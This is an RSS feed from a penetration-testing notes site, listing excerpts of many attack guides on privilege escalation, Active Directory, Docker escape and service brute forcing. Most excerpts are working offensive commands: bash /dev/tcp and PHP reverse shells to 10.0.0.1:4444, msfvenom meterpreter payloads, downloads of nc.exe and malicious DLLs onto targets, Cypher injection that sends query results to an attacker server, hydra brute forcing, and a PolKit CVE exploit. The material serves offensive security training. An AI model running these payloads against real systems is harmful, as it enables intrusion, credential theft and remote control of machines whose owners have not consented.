<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Privilege Escalation on D0CUM3NTN4T10N</title>
    <link>https://documentnation.github.io/tags/privilege-escalation/</link>
    <description>Recent content in Privilege Escalation on D0CUM3NTN4T10N</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Sat, 23 Dec 2023 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://documentnation.github.io/tags/privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Reverse Shell with Pwncat</title>
      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-pwncat/</link>
      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-pwncat/</guid>
      <description>It can be downloaded from here.&#xA;For listening from remote connection, run the following command.&#xA;pwncat-cs -lp 4444 # For Windows target pwncat-cs -m windows -lp 4444 Commands linkAfter reverse connecting, we can execute commands either local or remote.&#xA;# Switch between Local and Remote shell Ctrl&amp;#43;D # Upload a file to target machine (e.g. upload example.txt from local to remote) (local) upload ./example.txt /tmp/example.txt </description>
    </item>
    <item>
      <title>Reverse Shell Cheat Sheet</title>
      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-cheat-sheet/</link>
      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-cheat-sheet/</guid>
      <description>Setup Listener linkFirst of all, we need to start a listener in local machine to get an incoming connection.&#xA;nc -lvnp 4444 # For more elegant shell, use `rlwrap`. # https://github.com/hanslub42/rlwrap rlwrap nc -lvnp 4444 Online Generator link Reverse Shell Generator Bash link bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; /bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; # For URL param /?q=bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261 /?q=`bash&amp;#43;-c&amp;#43;&amp;#39;bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261&amp;#39;` with Base64 linkExecute the following commands in target machine.</description>
    </item>
    <item>
      <title>Shadow Credentials</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/shadow-credentials/</link>
      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/shadow-credentials/</guid>
      <description>Exploit linkIf the attacker can modify the target object&amp;rsquo;s (user or computer account) attribute msDS-KeyCredentialLink and append it with alternate credentials in the form of certificates, he takes over the account in AD.&#xA;Using Certipy link # -k: Use Kerberos authentication certipy shadow auto -account &amp;#34;targetuser&amp;#34; -u &amp;#34;username@example.local&amp;#34; -p &amp;#39;password&amp;#39; -dc-ip 10.0.0.1 -target dc.example.local -k Using Whisker linkWhisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute.</description>
    </item>
    <item>
      <title>Windows PrivEsc with Registry Keys</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-registry-keys/</link>
      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-registry-keys/</guid>
      <description>Investigation linkFind interesting registry or values in registry keys.&#xA;# HKLM: HKEY_LOCAL_MACHINE reg query HKLM reg query HKLM\SAM reg query HKLM\SAM\SAM reg query HKLM\SECURITY reg query HKLM\SOFTWARE reg query HKLM\SYSTEM # Find user credentials reg query “HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon” # HKU: HKEY_USERS reg query HKU reg query HKU\S-1-2-3 # HKCU: HKEY_CURRENT_USER reg query HKCU reg query HKCU\System Reveal Password from Registry Hives linkA hive is a logical group of keys, subkeys, and values in the registry that has a set of supporting files loaded into memory when the operating system is started or a user logs in.</description>
    </item>
    <item>
      <title>Windows PrivEsc with SeBackupPrivilege</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/</link>
      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/</guid>
      <description>Investigation linkFirst check if the current user has SeBackupPrivilege in the privilege information.&#xA;whoami /all If so, we can read arbitrary files on the system include administrator&amp;rsquo;s files, SAML file, SYSTEM registry file, etc.&#xA;Exploitation (Read Sensitive Files) link1. Download &amp;amp; Upload Malicious DLLs linkIn local machine, download malicious dlls from here&#xA;# If powershell, Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeUtils.dll -OutFile .\SeBackupPrivilegeUtils.dll Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeCmdLets.dll -OutFile .\SeBackupPrivilegeCmdLets.dll # If winrm, upload SeBackupPrivilegeUtils.dll upload SeBackupPrivilegeCmdLets.</description>
    </item>
    <item>
      <title>MySQL Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/database/mysql-pentesting/</link>
      <pubDate>Tue, 21 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/database/mysql-pentesting/</guid>
      <description>Enumeration link nmap --script mysql-info -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-enum -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-brute -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-databases -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-users -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-* -p 3306 &amp;lt;target-ip&amp;gt; Brute Force Credentials link hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; mysql hydra -L usernames.txt -p password &amp;lt;target-ip&amp;gt; mysql Configuration Files link cat /etc/mysql/my.cnf cat /etc/mysql/mysql.conf.d/mysqld.cnf Connect linkmysql command can be replaced with mariadb .</description>
    </item>
    <item>
      <title>Web Reverse Shell</title>
      <link>https://documentnation.github.io/docs/hdks/shell/web-reverse-shell/</link>
      <pubDate>Tue, 21 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/shell/web-reverse-shell/</guid>
      <description>PHP Reverse Shell (Linux) link # From local script (it&amp;#39;s stored by default in Kali or Parrot) cp /usr/share/webshell/php/php-reverse-shell.php ./shell.php # From repo (https://github.com/pentestmonkey/php-reverse-shell) wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php # From repo (https://github.com/flozz/p0wny-shell) wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -O shell.php Replace the $ip and the $port in the script with your local ip and port.&#xA;Without fsockopen, and for FreeBSD link &amp;lt;?php set_time_limit (0); $ip = &amp;#39;10.0.0.1&amp;#39;; // CHANGE THIS $port = 4444; // CHANGE THIS // Spawn shell process $descriptorspec = array( 0 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;r&amp;#34;), // stdin is a pipe that the child will read from 1 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;w&amp;#34;), // stdout is a pipe that the child will write to 2 =&amp;gt; array(&amp;#34;file&amp;#34;, &amp;#34;/tmp/error-output.</description>
    </item>
    <item>
      <title>Reverse Shell with Metasploit</title>
      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-metasploit/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-metasploit/</guid>
      <description>Generate Reverse Shell Payload link1. Create a Payload using MsfVenom link # Linux msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf &amp;gt; shell.elf # Windows msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f aspx -o shell.aspx 2. Start Listener using MsfConsole link msfconsole msf&amp;gt; use exploit/multi/handler # Linux msf&amp;gt; set payload linux/x86/meterpreter/reverse_tcp # Windows msf&amp;gt; set payload windows/meterpreter/reverse_tcp # or msf&amp;gt; set payload windows/x64/meterpreter/reverse_tcp msf&amp;gt; set lhost 10.</description>
    </item>
    <item>
      <title>Windows PrivEsc with AD CS</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-adcs/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-adcs/</guid>
      <description>⚠️DISCLAIMER: I still don&amp;rsquo;t really understand AD CS, so it might be wrong. If so, please let me know via GitHub Issue or Pull Request.&#xA;Enumerate Certificate Templates linkCertificate templates are the rule set for AD CS. It contains CA name, CA permissions, etc. Some attributes are related to vulnerabilities to privilege escalation.&#xA;To enumerate them, we can use Certify or Certipy.&#xA;certipy find -u user@example.local -p password -dc-ip &amp;lt;target-ip&amp;gt; -stdout certipy find -vulnerable -u user@example.</description>
    </item>
    <item>
      <title>Windows PrivEsc with RemotePotato</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-remotepotato/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-remotepotato/</guid>
      <description>Exploit linkReference: RemotePotato0&#xA;According to the RemotePotato0&amp;rsquo;s README, it abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user).&#xA;We can download the executable from https://github.com/antonioCoco/RemotePotato0.&#xA;Module 0 (-m 0: Rpc2Http cross protocol relay server + potato trigger) link # In attack machine sudo socat tcp-listen:135,fork,reuseaddr tcp:&amp;lt;target-ip&amp;gt;:9999 &amp;amp; sudo ntlmrelayx.</description>
    </item>
    <item>
      <title>Docker Escape</title>
      <link>https://documentnation.github.io/docs/hdks/container/docker/docker-escape/</link>
      <pubDate>Fri, 03 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/container/docker/docker-escape/</guid>
      <description>Investigation linkIf we are in the docker container, we first need to investigate basic information about the container.&#xA;# Environment variables env # Command path echo $PATH ls -al /usr/local/bin ls -al /usr/local/sbin ls -al /usr/bin ls -al /bin # Bash history cat /root/.bash_history cat /home/&amp;lt;username&amp;gt;/.bash_history # Interesting Directories ls -al /etc ls -al /mnt ls -al /opt ls -al /srv ls -al /var/www ls -al /tmp ls -al /dev/shm # Cron cat /etc/cron* crontab -l # Process ps aux ps aux | cat # https://github.</description>
    </item>
    <item>
      <title>Kerberos Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberos-pentesting/</link>
      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberos-pentesting/</guid>
      <description>Enumeration linkTo enumerate automatically, you can use nmap.&#xA;nmap --script krb5-enum-users --script-args krb5-enum-users.realm=&amp;#39;example.local&amp;#39;-p 88 &amp;lt;target-ip&amp;gt; Brute Force Authentication linkKerbrute is a tool to perform Kerberos pre-auth bruteforcing.&#xA;The wordlist (e.g. combos.txt) specified must be the &amp;ldquo;username:password&amp;rdquo; combinations.&#xA;# -v: verbose mode *it&amp;#39;s recommended to add this flag otherwise we cannot confirm if the user exist or not. # --dc: domain controller # -d: domain # combos.txt: the wordlist specified must be combinations with &amp;#34;username:password&amp;#34;.</description>
    </item>
    <item>
      <title>SSH (Secure Shell) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/ssh-pentesting/</link>
      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/ssh-pentesting/</guid>
      <description>Enumeration link nmap --script ssh-brute -p 22 &amp;lt;target-ip&amp;gt; nmap --script ssh-auth-methods --script-args=&amp;#34;ssh.user=username&amp;#34; -p 22 &amp;lt;target-ip&amp;gt; nmap --script ssh-* -p 22 &amp;lt;target-ip&amp;gt; # User enumeration msfconsole msf&amp;gt; use auxiliary/scanner/ssh/ssh_enumusers Brute Force Credentials link # -t: tasks hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; ssh -t 4 hydra -L usernames.txt -p password &amp;lt;target-ip&amp;gt; ssh -t 4 # Specific ports hydra -l username -P passwords.txt -s 2222 &amp;lt;target-ip&amp;gt; ssh -t 4 hydra -l username -P passwords.</description>
    </item>
    <item>
      <title>Sudo Privilege Escalation by Overriding Shared Library</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/</link>
      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/</guid>
      <description>LD_PRELOAD, LD_LIBRARY_PATH Overwriting linkInvestigation linkCheck sudo commands.&#xA;sudo -l The below is the output example.&#xA;env_keep&amp;#43;=LD_PRELOAD (ALL : ALL) NOPASSWD: somecmd If we find the sudo command keeps LD_PRELOAD environment, we can overwrite this variable to load our custome shared object and escalate the privileges.&#xA;Also, we can replace the LD_PRELOAD with LD_LIBRARY_PATH.&#xA;By the way, to list shared libraries required by the executable, use ldd command.&#xA;ldd somecmd Exploitation linkFirst off, create exploit.</description>
    </item>
    <item>
      <title>Windows PrivEsc with LocalPotato</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-localpotato/</link>
      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-localpotato/</guid>
      <description>GodPotato linkRequired Privileges link SeImpersonatePrivilege Payloads link https://github.com/BeichenDream/GodPotato GodPotato -cmd &amp;#34;cmd /c whoami&amp;#34; JuicyPotato linkRequired Privilege link SeImpersonatePrivilege or SeAssignPrimaryToken Payloads link https://github.com/antonioCoco/JuicyPotatoNG https://github.com/ohpe/juicy-potato Before exploiting, we need to upload nc.exe (it is available from here) to the target machine.&#xA;Invoke-WebRequest -Uri http://10.0.0.1:8000/nc.exe -OutFile c:\Temp\nc.exe Next start a listener in local machine.&#xA;nc -lvnp 4444 Then execute JuicyPotato in target machine.&#xA;JuicyPotatoNG.exe -t * -p &amp;#34;c:\Temp\nc.exe&amp;#34; -a &amp;#34;10.0.0.1 4444 -e cmd.</description>
    </item>
    <item>
      <title>AD CS (Active Directory Certificate Services) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/ad-cs-pentesting/</link>
      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ad-cs-pentesting/</guid>
      <description>Enumeration linkWe can retrieve certificates information on target Windows machine using certutil.&#xA;# Dump general information certutil -dump # Dump information about certificate authority certutil -ca certutil -catemplates # List all templates certutil -template # specify the template certutil -template ExampleTemplate Then check if Allow Full Control or Allow Write include the group which current user belongs to. If so, we can modify the template and might be able to escalate privilege.</description>
    </item>
    <item>
      <title>DNS (Domain Name Systems) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/dns/dns-pentesting/</link>
      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/dns/dns-pentesting/</guid>
      <description>Enumeration linkYou can use Nmap to enumerate automatically.&#xA;nmap --script dns-nsec-enum --script-args dns-nsec-enum.domains vulnerable.com -p 53 &amp;lt;target-ip&amp;gt; nmap --script dns-random-srcport -p 53 &amp;lt;target-ip&amp;gt; nmap --script dns-recursion -p 53 &amp;lt;target-ip&amp;gt; nmap --script dns-service-discovery -p 53 &amp;lt;target-ip&amp;gt; nmap --script dns-* -p 53 &amp;lt;target-ip&amp;gt; nmap -n --script &amp;#34;(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport&amp;#34; &amp;lt;target-ip&amp;gt; Investigation linkDNSdumpster is an online tool for reconnaissance DNS records.&#xA;IP Address from the Domain link host example.</description>
    </item>
    <item>
      <title>Windows PrivEsc with Kerberos</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-kerberos/</link>
      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-kerberos/</guid>
      <description>Privilege Escalation linkFirst off, download two PS scripts in local machine..&#xA;wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1 Then upload them to the target machine.&#xA;# Evil-WinRM upload PowerView.ps1 Import-Module .\PowerView.ps1 upload Powermad.ps1 Import-Module .\Powermad.ps1 1. Check User&amp;rsquo;s Permission and Windows Versions linkCheck if users are allowed to create a new computer object on the domain.&#xA;Get-DomainObject -Identity &amp;#34;dc=example,dc=com&amp;#34; -Domain example.com # ------------------------- # Result ms-ds-machineaccountquota: 10 And check if the machine is at least Windows Server 2012.</description>
    </item>
    <item>
      <title>Shared Library Hijacking</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/shared-library-hijacking/</link>
      <pubDate>Wed, 13 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/shared-library-hijacking/</guid>
      <description>Investigation linkWhen we find the binary file as setuid or sudo command, check the strings of the binary file.&#xA;strings ./example strace ./example gdb ./example ... foo.so ... If the binary file uses a shared library (e.g. foo.so) and this library can be modified, we can update it and get a root shell.&#xA;find / -type f -name &amp;#34;foo.so&amp;#34; 2&amp;gt;/dev/null ls -al /path/to/foo.so drwxrwxrwx 1 user user 64 Dec 15 09:13 foo.</description>
    </item>
    <item>
      <title>Prototype Pollution in Server-Side</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-server-side/</link>
      <pubDate>Fri, 11 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-server-side/</guid>
      <description>Investigation linkIf the properties is affected by our pollution, our polluted properties might be injected into the target object as follow.&#xA;POST /user/update HTTP/1.1 Host: example.com ... { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;__proto__&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } // Other option { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;constructor&amp;#34;: { &amp;#34;prototype&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } } // Bypass sanitization 1 { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;__pro__proto__to__&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } // Bypass sanitization 2 { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.</description>
    </item>
    <item>
      <title>PolKit Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/polkit-privilege-escalation/</link>
      <pubDate>Mon, 24 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/polkit-privilege-escalation/</guid>
      <description>CVE-2021-3560 link1. Send a dbus message to create a new user linkCreate a new user by sending a dbus message.&#xA;# string:tester: The new user named &amp;#34;tester&amp;#34;. # string:&amp;#34;Tester Account&amp;#34;: The description of the new user. # int32:1: sudo group dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:tester string:&amp;#34;Tester Account&amp;#34; int32:1 &amp;amp; sleep 0.005s; kill $! Then check the new user ID (uid).&#xA;id tester uid=1000(tester) gid=1000(tester) groups=1000(tester),27(sudo) 2. Generate a new password hash link # -6: SHA512 openssl passwd -6 password123 Copy the output hash.</description>
    </item>
    <item>
      <title>Sudo Git Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/</link>
      <pubDate>Sun, 23 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/</guid>
      <description>Git Add/Commit link sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example add -A sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example commit -m &amp;#34;commit&amp;#34; If we can commit the git repository as root, we may be able to escalate privileges.&#xA;Exploitation link Create a Payload echo &amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39; &amp;gt; /tmp/revshell chmod &amp;#43;x /tmp/revshell Set Git Config # Go to the git repository cd /opt/example git init echo &amp;#39;*.php filter=indent&amp;#39; &amp;gt; .git/info/attributes git config filter.</description>
    </item>
    <item>
      <title>Sudo Systemctl Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/</link>
      <pubDate>Wed, 12 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/</guid>
      <description>Modify Configurations link sudo -l (ALL) NOPASSWD: systemctl If we can run &amp;ldquo;systemctl&amp;rdquo; command as root, and we can edit the config file, then we might be a root user.&#xA;1. Update the Config File linkWe need to insert the payload for reverse shell to get a root shell into the /etc/systemd/system/example.service.&#xA;[Unit] This is an example service. [Service] Type=simple User=root ExecStart=/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/4444 0&amp;gt;&amp;amp;1&amp;#39; [Install] WantedBy=multi-user.target Replace “&amp;lt;local-ip&amp;gt;” with your local ip address.</description>
    </item>
    <item>
      <title>Buffer Overflow Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/buffer-overflow-privilege-escalation/</link>
      <pubDate>Wed, 05 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/buffer-overflow-privilege-escalation/</guid>
      <description>Baron Samedit (Heap Buffer Overflow) CVE-2021-3156 link1. Check Vulnerability to Overwrite Heap Buffer in Target Machine link sudoedit -s &amp;#39;\&amp;#39; $(python3 -c &amp;#39;print(&amp;#34;A&amp;#34;*1000)&amp;#39;) malloc(): invalid size (unsorted) Aborted 2. Proof of Concept linkThere are various PoC online.&#xA;https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156. https://github.com/blasty/CVE-2021-3156 Pwfeedback link1. Check Enabling the Pwfeedback in /etc/sudoers linkIf so, when running sudo command and inputting password, asterisk will be displayed.&#xA;You can make it the buffer overflow.&#xA;cat /etc/sudoers # ------------------------------------------- .</description>
    </item>
    <item>
      <title>Rust Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/rust-privilege-escalation/</link>
      <pubDate>Tue, 27 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/rust-privilege-escalation/</guid>
      <description>Reverse Shell linkReference: https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs&#xA;We can create a binary or module to reverse shell.&#xA;cd /path/to/rust/project/src vim lib.rs (In vim editor, insert a reverse shell code into a file) cargo build </description>
    </item>
    <item>
      <title>Gnuplot Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/gnuplot-privilege-escalation/</link>
      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/gnuplot-privilege-escalation/</guid>
      <description>Command Execution linkThe script file of gnuplot can be used to execute system commands as below.&#xA;gnuplot test.plt Contents of the .plt is like the following.&#xA;system &amp;#34;whoami&amp;#34; # Reverse shell system &amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34; </description>
    </item>
    <item>
      <title>Moby Docker Engine PrivEsc</title>
      <link>https://documentnation.github.io/docs/hdks/container/docker/moby-docker-engine-privesc/</link>
      <pubDate>Tue, 02 May 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/container/docker/moby-docker-engine-privesc/</guid>
      <description>Directory Traversal &amp;amp; Arbitrary Command Execution (CVE-2021-41091 ) link1. Find Docker Container Directory linkFirst off, find the directory which the docker container mounted&#xA;findmnt # Results e.g. /var/lib/docker/overlay2/abcdef...xyz/merged Assume the directory above found, we can investigate in the directory.&#xA;ls -la /var/lib/docker/overlay2/abcdef...xyz/merged/ 2. Prepare SUID Binary in Container linkIf we can be root in the docker container, set uid arbitrary binary as below. Please note that we need to do that in the container, not the real host.</description>
    </item>
    <item>
      <title>Neo4j Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/database/neo4j-pentesting/</link>
      <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/database/neo4j-pentesting/</guid>
      <description>Default Credentials link neo4j:neo4j Common Directories &amp;amp; Files in Local System link /var/lib/neo4j /var/log/neo4j Cypher Injection linkBefore injecting payloads, we need to start local web server to fetch the result of the query.&#xA;sudo python3 -m http.server 80 Below are payloads.&#xA;In some payloads, replace 10.0.0.1 with your ip address.&#xA;&amp;lt;!-- Get Neo4j version --&amp;gt; &amp;#39; OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM &amp;#39;http://10.</description>
    </item>
    <item>
      <title>Pip Download Code Execution</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/pip-download-code-execution/</link>
      <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/pip-download-code-execution/</guid>
      <description>Exploitation link1. Create Malicious Python Package linkReference: https://github.com/wunderwuzzi23/this_is_fine_wuzzi&#xA;Assume the package named &amp;ldquo;exploitpy&amp;rdquo;.&#xA;We need to create &amp;ldquo;setup.py&amp;rdquo; in the project root, and &amp;quot;init.py&amp;quot;, &amp;ldquo;main.py&amp;rdquo; in src directory.&#xA;mkdir exploitpy cd exploitpy touch setup.py mkdir src touch src/__init__.py echo &amp;#39;print(&amp;#34;hello&amp;#34;)&amp;#39; &amp;gt; src/main.py Below is the content of the &amp;ldquo;setup.py&amp;rdquo;.&#xA;The arbitrary code is injected in the “RunCommand” method. It is executed when pip download command.&#xA;# setup.py from setuptools import setup, find_packages from setuptools.</description>
    </item>
    <item>
      <title>ManageEngine ADSelfService Plus PrivEsc</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/manageengine-adselfservice-plus/</link>
      <pubDate>Sun, 16 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/manageengine-adselfservice-plus/</guid>
      <description>Directories link dir -Force \Program Files (x86)\ManageEngine\ADSelfService Plus\ Unauthenticated SAML RCE (CVE-2022-47966) linkReference: https://www.rapid7.com/db/modules/exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966/&#xA;msfconsole msf&amp;gt; use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966 msf&amp;gt; set GUID 43ae36f51da65753530a64b37a510a53 msf&amp;gt; set ISSUER_URL http://example.com/adfs/services/trust msf&amp;gt; set RHOSTS &amp;lt;target-ip&amp;gt; msf&amp;gt; set RPORT 9251 msf&amp;gt; set LHOST &amp;lt;local-ip&amp;gt; msf&amp;gt; set LPORT 4444 msf&amp;gt; run meterpreter&amp;gt; shell </description>
    </item>
    <item>
      <title>SSSD Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sssd-privilege-escalation/</link>
      <pubDate>Sun, 16 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sssd-privilege-escalation/</guid>
      <description>Find Credentials link ls -la /var/lib/sss/ # Find credentials # If we find the hash, crack it using John or Hashcat. strings /var/lib/sss/db/example.ldb </description>
    </item>
    <item>
      <title>Icinga Web Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/icinga-web-pentesting/</link>
